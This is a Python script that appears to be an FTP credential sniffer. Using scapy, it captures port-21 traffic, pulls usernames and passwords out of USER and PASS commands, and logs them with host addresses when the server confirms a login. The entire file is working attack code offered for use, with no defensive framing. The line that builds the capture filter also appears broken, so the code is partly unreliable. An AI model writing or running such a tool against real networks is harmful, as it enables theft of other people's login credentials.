from scapy.all import *
from multiprocessing import Process
from colorama import init, Fore
import sys,logging,time

white   = Fore.WHITE
black   = Fore.BLACK
red     = Fore.RED
reset   = Fore.RESET
blue    = Fore.BLUE
cyan    = Fore.CYAN
yellow  = Fore.YELLOW
green   = Fore.GREEN
magenta = Fore.MAGENTA

class FTPSniff(object):
    x = random.randint(1000,9999)
    def __init__(self,pcap_path=f"files/{x}-ftp.pcap", ftp_file=f"files/{x}-ftp.log",verbose=False,targets=""):
        self.pcap_path   = pcap_path
        self.ftp_file    = ftp_file
        self.main_thread = None
        self.usernames   = []
        self.passwords   = []
        self.addrs       = []
        self.targets = list(targets.split("/"))
        
        init()
        logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
        logging.addLevelName(logging.WARNING, f"[{red}!{reset}]")
        logging.addLevelName(logging.INFO, f"[{cyan}*{reset}]")
        logging.addLevelName(logging.DEBUG, f"[{magenta}*{reset}]")
        logging.basicConfig(format=f"%(levelname)s %(message)s", level=logging.DEBUG if verbose else logging.INFO)

    def check_login(self, pkt, username, passwd):
        if b'230' in pkt[Raw].load:
            return True
        else:
            return False
		
    def check_for_ftp(self,pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            return True
        else:
            return False
			
    def handle_pkt(self,pkt):
        if not self.check_for_ftp(pkt):
            return

        wrpcap(self.pcap_path, pkt)
        data = str(pkt[Raw].load).replace("b","").replace("'","")

        if 'USER ' in data:
            user = data.split("USER ")[1].strip()
            self.usernames.append(user)
        elif 'PASS ' in data:
            passwd = data.split("PASS ")[1].strip()
            self.passwords.append(passwd)
            self.addrs.append((pkt[IP].src,pkt[IP].dst))
        else:
            try:
                if self.check_login(pkt,self.usernames[-1],self.passwords[-1]):
                    with open(self.ftp_file, "a+") as fd:
                        user = self.usernames[-1].replace("\r\n","").replace("\\r\\n","")
                        passwd = self.passwords[-1].replace("\r\n","").replace("\\r\\n","")
                        fd.write(f"{self.addrs[-1][0]} -> {self.addrs[-1][1]}:\n   Username: {user}\n   Password: {passwd}\n\n")
                        logging.info(f"{self.addrs[-1][0]} -> {self.addrs[-1][1]}:\n\tUsername: {user}\n\tPassword: {passwd}")
            except:
                pass

    def sniff_thread(self):
        filter_ = f"port 21{f' and host {x}' for x in self.targets}"
        sniff(filter=filter_,prn=self.handle_pkt)
    
    def start(self):
        logging.debug("FTP: Starting sniff thread")
        self.main_thread = Process(target=self.sniff_thread)
        self.main_thread.start()
    
    def stop(self):
        logging.debug("FTP: Sniff thread stopped")
        self.main_thread.kill()
        return (self.pcap_path, self.ftp_file)

if __name__ == "__main__":
    ftp = FTPSniff(verbose=True)
    ftp.start()

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(ftp.stop())